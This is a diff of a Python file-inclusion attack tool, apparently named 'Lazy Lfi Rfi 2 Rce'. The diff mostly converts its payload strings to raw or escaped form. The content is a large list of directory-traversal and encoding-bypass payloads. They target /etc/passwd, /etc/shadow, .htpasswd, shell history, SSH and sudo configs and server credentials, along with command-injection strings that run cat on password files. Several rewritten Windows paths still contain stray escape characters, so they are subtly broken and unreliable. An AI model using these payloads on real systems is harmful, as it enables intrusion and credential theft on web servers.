@@ -1,26 +1,27 @@
-#!/usr/bin/env python3 
-#_*_ coding: utf8 _*_
+#!/usr/bin/env python3
 import argparse
-import urllib.parse
-import requests
 import signal
 import sys
+import urllib.parse
 from os import path
-BANNER = """
-,-.      .--.   _____.-.   .-. .---.  .-.  .-..-. .-.               
-| |     / /\ \ /___  /\ \_/ )// .-. ) | |/\| ||  \| |               
-| |    / /__\ \   / /) \   (_)| | |(_)| /  \ ||   | |               
-| |    |  __  |  / /(_) ) (   | | | | |  /\  || |\  |               
-| `--. | |  |)| / /___  | |   \ `-' / |(/  \ || | |)|               
-|( __.'|_|  (_)(_____/ /(_|    )---'  (_)   \|/(  (_)               
-(_)                   (__)    (_)            (__)                   
-,-.      .--.   _____.-.   .-.,-.    ,---.,-.2,---.   ,--,  ,---.   
-| |     / /\ \ /___  /\ \_/ )/| |    | .-'|(| | .-.\.' .')  | .-'   
-| |    / /__\ \   / /) \   (_)| |    | `-.(_) | `-'/|  |(_) | `-.   
-| |    |  __  |  / /(_) ) (   | |    | .-'| | |   ( \  \    | .-'   
-| `--. | |  |)| / /___  | |   | `--. | |  | | | |\ \ \  `-. |  `--. 
-|( __.'|_|  (_)(_____/ /(_|   |( __.')\|  `-' |_| \)\ \____\/( __.' 
-(_)                   (__)    (_)   (__)          (__)     (__)  
+
+import requests
+
+BANNER = r"""
+,-.      .--.   _____.-.   .-. .---.  .-.  .-..-. .-.
+| |     / /\ \ /___  /\ \_/ )// .-. ) | |/\| ||  \| |
+| |    / /__\ \   / /) \   (_)| | |(_)| /  \ ||   | |
+| |    |  __  |  / /(_) ) (   | | | | |  /\  || |\  |
+| `--. | |  |)| / /___  | |   \ `-' / |(/  \ || | |)|
+|( __.'|_|  (_)(_____/ /(_|    )---'  (_)   \|/(  (_)
+(_)                   (__)    (_)            (__)
+,-.      .--.   _____.-.   .-.,-.    ,---.,-.2,---.   ,--,  ,---.
+| |     / /\ \ /___  /\ \_/ )/| |    | .-'|(| | .-.\.' .')  | .-'
+| |    / /__\ \   / /) \   (_)| |    | `-.(_) | `-'/|  |(_) | `-.
+| |    |  __  |  / /(_) ) (   | |    | .-'| | |   ( \  \    | .-'
+| `--. | |  |)| / /___  | |   | `--. | |  | | | |\ \ \  `-. |  `--.
+|( __.'|_|  (_)(_____/ /(_|   |( __.')\|  `-' |_| \)\ \____\/( __.'
+(_)                   (__)    (_)   (__)          (__)     (__)
 [*] Iniciando: Lazy Lfi Rfi 2 Rce [;,;]
 """
 print(BANNER)
@@ -145,7 +146,7 @@ def main():
         "../../../apache/logs/error.log",
         "../../apache/logs/error.log",
         "../apache/logs/error.log",
-        "/apache\php\php.ini",
+        r"/apache\php\php.ini",
         "\\&apos;/bin/cat%20/etc/passwd\\&apos;",
         "\\&apos;/bin/cat%20/etc/shadow\\&apos;",
         "/.bash_history",
@@ -156,33 +157,33 @@ def main():
         "/boot/grub/grub.conf",
         "/./././././././././././boot.ini",
         "/../../../../../../../../../../../boot.ini",
-        "/..\../..\../..\../..\../..\../..\../boot.ini",
+        r"/..\../..\../..\../..\../..\../..\../boot.ini",
         "/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini",
         "..//..//..//..//..//boot.ini",
         "../../../../../../../../../../../../boot.ini",
         "../../boot.ini",
-        "..\../..\../..\../..\../boot.ini",
-        "..\../..\../boot.ini",
-        "..\..\..\..\..\..\..\..\..\..\boot.ini",
-        "\..\..\..\..\..\..\..\..\..\..\boot.ini",
+        r"..\../..\../..\../..\../boot.ini",
+        r"..\../..\../boot.ini",
+        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
+        "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
         "/../../../../../../../../../../../boot.ini%00",
         "../../../../../../../../../../../../boot.ini%00",
-        "..\..\..\..\..\..\..\..\..\..\boot.ini%00",
+        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini%00",
         "/../../../../../../../../../../../boot.ini%00.html",
         "/../../../../../../../../../../../boot.ini%00.jpg",
         "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
         "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini",
         "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
         "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow",
-        "c:\apache\logs\access.log",
-        "c:\apache\logs\error.log",
-        "c:\AppServ\MySQL",
+        "c:\apache\\logs\access.log",
+        "c:\apache\\logs\\error.log",
+        r"c:\AppServ\MySQL",
         "C:/boot.ini",
         "C:\boot.ini",
         "/C:/inetpub/ftproot/",
         "C:/inetpub/wwwroot/global.asa",
-        "C:\inetpub\wwwroot\global.asa",
-        "c:\inetpub\wwwroot\index.asp",
+        r"C:\inetpub\wwwroot\global.asa",
+        r"c:\inetpub\wwwroot\index.asp",
         "/config.asp",
         "../config.asp",
         "config.asp",
@@ -197,12 +198,12 @@ def main():
         "../_config.php%00",
         "../../../../../../../../conf/server.xml",
         "/core/config.php",
-        "c:\Program Files\Apache Group\Apache\logs\access.log",
-        "c:\Program Files\Apache Group\Apache\logs\error.log",
+        "c:\\Program Files\\Apache Group\\Apache\\logs\access.log",
+        r"c:\Program Files\Apache Group\Apache\logs\error.log",
         "/.cshrc",
-        "c:\System32\Inetsrv\metabase.xml",
+        r"c:\System32\Inetsrv\metabase.xml",
         "c:WINDOWS/system32/",
-        "d:\AppServ\MySQL",
+        r"d:\AppServ\MySQL",
         "database.asp",
         "database.js",
         "database.php",
@@ -210,8 +211,8 @@ def main():
         "dbase.php a",
         "db.php",
         "../../../../../../../dev",
-        "/D:\Program Files\"",
-        "d:\System32\Inetsrv\metabase.xml",
+        "/D:\\Program Files\"",
+        r"d:\System32\Inetsrv\metabase.xml",
         "/etc/apache2/apache2.conf",
         "/etc/apache2/conf/httpd.conf",
         "/etc/apache2/httpd.conf",
@@ -347,7 +348,7 @@ def main():
         "/./././././././././././etc/passwd",
         "/../../../../../../../../../../etc/passwd",
         "/../../../../../../../../../../etc/passwd^^",
-        "/..\../..\../..\../..\../..\../..\../etc/passwd",
+        r"/..\../..\../..\../..\../..\../..\../etc/passwd",
         "/etc/passwd",
         "../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
         "../../../../../../../../../../../../../../../../../../../../../etc/passwd",
@@ -371,9 +372,9 @@ def main():
         "../../../etc/passwd",
         "../../etc/passwd",
         "../etc/passwd",
-        "..\..\..\..\..\..\..\..\..\..\etc\passwd",
+        r"..\..\..\..\..\..\..\..\..\..\etc\passwd",
         ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
-        "\..\..\..\..\..\..\..\..\..\..\etc\passwd",
+        r"\..\..\..\..\..\..\..\..\..\..\etc\passwd",
         "etc/passwd",
         "/etc/passwd%00",
         "../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
@@ -398,8 +399,8 @@ def main():
         "../../../etc/passwd%00",
         "../../etc/passwd%00",
         "../etc/passwd%00",
-        "..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
-        "\..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
+        r"..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
+        r"\..\..\..\..\..\..\..\..\..\..\etc\passwd%00",
         "/../../../../../../../../../../../etc/passwd%00.html",
         "/../../../../../../../../../../../etc/passwd%00.jpg",
         "../../../../../../etc/passwd&=%3C%3C%3C%3C",
@@ -458,16 +459,16 @@ def main():
         "/./././././././././././etc/shadow",
         "/../../../../../../../../../../etc/shadow",
         "/../../../../../../../../../../etc/shadow^^",
-        "/..\../..\../..\../..\../..\../..\../etc/shadow",
+        r"/..\../..\../..\../..\../..\../..\../etc/shadow",
         "/etc/shadow",
         "../../../../../../../../../../../../etc/shadow",
-        "..\..\..\..\..\..\..\..\..\..\etc\shadow",
+        r"..\..\..\..\..\..\..\..\..\..\etc\shadow",
         ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
-        "\..\..\..\..\..\..\..\..\..\..\etc\shadow",
+        r"\..\..\..\..\..\..\..\..\..\..\etc\shadow",
         "../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00",
         "../../../../../../../../../../../../etc/shadow%00",
-        "..\..\..\..\..\..\..\..\..\..\etc\shadow%00",
-        "\..\..\..\..\..\..\..\..\..\..\etc\shadow%00",
+        r"..\..\..\..\..\..\..\..\..\..\etc\shadow%00",
+        r"\..\..\..\..\..\..\..\..\..\..\etc\shadow%00",
         "etc/shadow%00",
         "/etc/ssh/sshd_config",
         "/etc/sudoers",
@@ -486,10 +487,10 @@ def main():
         "/etc/wu-ftpd/ftphosts",
         "/etc/wu-ftpd/ftpusers",
         "/.forward",
-        "/home2\bin\stable\apache\php.ini",
+        "/home2\bin\\stable\apache\\php.ini",
         "/home/apache/conf/httpd.conf",
         "/home/apache/httpd.conf",
-        "/home\bin\stable\apache\php.ini",
+        "/home\bin\\stable\apache\\php.ini",
         "/.htpasswd",
         ".htpasswd",
         "../.htpasswd",
@@ -518,7 +519,7 @@ def main():
         "member/.htpasswd",
         "members/.htpasswd",
         "/.netrc",
-        "/NetServer\bin\stable\apache\php.ini",
+        "/NetServer\bin\\stable\apache\\php.ini",
         "/opt/apache2/conf/httpd.conf",
         "/opt/apache/conf/httpd.conf",
         "/opt/lampp/logs/access_log",
@@ -538,10 +539,10 @@ def main():
         ".passwd",
         "../.passwd",
         "passwd.dat",
-        "/php4\php.ini",
-        "/php5\php.ini",
-        "/php\php.ini",
-        "/PHP\php.ini",
+        r"/php4\php.ini",
+        r"/php5\php.ini",
+        r"/php\php.ini",
+        r"/PHP\php.ini",
         "/private/etc/httpd/httpd.conf",
         "/private/etc/httpd/httpd.conf.default",
         "/proc/cpuinfo",
@@ -558,10 +559,10 @@ def main():
         "/proc/self/envron",
         "/proc/version",
         "/.profile",
-        "/Program Files\Apache Group\Apache2\conf\httpd.conf",
-        "/Program Files\Apache Group\Apache\conf\httpd.conf",
-        "/Program Files\Apache Group\Apache\logs\access.log",
-        "/Program Files\Apache Group\Apache\logs\error.log",
+        r"/Program Files\Apache Group\Apache2\conf\httpd.conf",
+        r"/Program Files\Apache Group\Apache\conf\httpd.conf",
+        "/Program Files\\Apache Group\\Apache\\logs\access.log",
+        r"/Program Files\Apache Group\Apache\logs\error.log",
         "/../../../../pswd",
         "/.rhosts",
         "/root/.bash_history",
@@ -833,12 +834,12 @@ def main():
         "/Volumes/webBackup/private/etc/httpd/httpd.conf",
         "/Volumes/webBackup/private/etc/httpd/httpd.conf.default",
         "/web/conf/php.ini",
-        "/WINDOWS\php.ini",
+        r"/WINDOWS\php.ini",
         "../../windows/win.ini",
-        "/WINNT\php.ini",
-        "/..\..\..\..\..\..\winnt\win.ini",
+        r"/WINNT\php.ini",
+        r"/..\..\..\..\..\..\winnt\win.ini",
         "/www/logs/proftpd.system.log",
-        "/xampp\apache\bin\php.ini",
+        "/xampp\apache\bin\\php.ini",
         "/.Xauthority",
         "..2fapache2flogs2ferror.log",
         "..2fapache2flogs2faccess.log",
